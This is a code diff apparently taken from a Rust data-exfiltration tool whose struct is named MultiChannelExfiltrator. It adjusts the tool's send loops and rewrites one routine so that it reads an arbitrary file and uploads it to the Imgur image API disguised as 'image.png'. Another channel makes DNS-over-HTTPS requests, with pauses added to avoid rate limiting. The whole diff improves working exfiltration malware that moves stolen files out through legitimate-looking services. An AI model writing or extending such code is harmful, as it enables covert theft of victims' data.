@@ -109,7 +109,7 @@ impl MultiChannelExfiltrator {
             }
             
             // Small delay to avoid rate limiting
-            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+            tokio::time::sleep(crate::constants::POLL_INTERVAL_NORMAL).await;
         }
         
         Ok(())
@@ -160,7 +160,7 @@ impl MultiChannelExfiltrator {
                 .await
                 .map_err(|e| format!("DoH request failed: {}", e))?;
             
-            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+            tokio::time::sleep(crate::constants::POLL_INTERVAL_NORMAL).await;
         }
         
         Ok(())
@@ -226,9 +226,10 @@ impl MultiChannelExfiltrator {
         let client = reqwest::Client::new();
         
         // Note: In production, use actual Imgur API credentials
+        let file_data = tokio::fs::read(path).await
+            .map_err(|e| format!("Failed to read file: {}", e))?;
         let form = reqwest::multipart::Form::new()
-            .file("image", path)
-            .map_err(|e| format!("Failed to create form: {}", e))?;
+            .part("image", reqwest::multipart::Part::bytes(file_data).file_name("image.png"));
         
         let _response = client
             .post("https://api.imgur.com/3/image")
